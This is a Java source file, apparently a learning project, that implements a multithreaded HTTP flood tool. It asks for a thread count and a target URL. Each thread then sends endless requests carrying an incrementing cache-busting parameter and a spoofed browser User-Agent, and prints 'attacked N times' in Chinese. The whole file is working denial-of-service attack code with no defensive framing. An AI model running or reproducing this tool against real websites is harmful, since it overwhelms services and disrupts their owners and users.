package com.muke.test;

import java.io.IOException;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;

public class TestAttack implements Runnable {
    private static String strUrl = null;
    private static long numL = 0;
    private static Scanner scanner = new Scanner(System.in);

    public void run() {
        //HttpURLConnection connection = null;
        InputStream urlStream = null;
        URL url = null;
        while (true) {
            try {
                //得到URL
                url = new java.net.URL(strUrl + numL);
                //访问
                //connection = (java.net.HttpURLConnection) url.openConnection();
                //connection.connect();
                HttpURLConnection connection = (HttpURLConnection) url.
                        openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");


                urlStream = connection.getInputStream();
                if (urlStream != null) {
                    ++numL;
                    urlStream.close();
                    System.out.println("攻击了" + numL + "次");
                }
                Thread.sleep(1);
            } catch (InterruptedException e) {
                e.getMessage();
                try {
                    Thread.sleep(1);
                } catch (InterruptedException ie) {
                    ie.printStackTrace();
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) throws MalformedURLException {
        int threadNum;
        do {
            System.out.println("请输入要生成的线程数:");
            threadNum = scanner.nextInt();
            System.out.println("请输入要攻击的网址:");
            String str = scanner.next();
            if (!str.startsWith("")) {
                strUrl = "http://" + str;
                System.out.println(strUrl);
            } else {
                strUrl = str;
            }
            if (str.indexOf("?") >= 0) {
                strUrl = strUrl + "&num=";
            } else {
                strUrl = strUrl + "?num=";
            }

            //feedback
            System.out.println("--------------------------------------");
            System.out.println("线程数:" + threadNum);
            System.out.println("攻击地址" + str);
            System.out.println("请再次确认(Y/N):");
            String tmp = scanner.next();

            if ("Y".equalsIgnoreCase(tmp)) {
                break;
            } else if ("N".equalsIgnoreCase(tmp)) {
            } else {
                System.out.println("输入错误,请重新输入(Y/N):");
            }
        } while (true);

        for (int i = 0; i < threadNum; i++) {
            TestAttack at = new TestAttack();
            Thread t = new Thread(at);
            t.start();
        }
    }
}
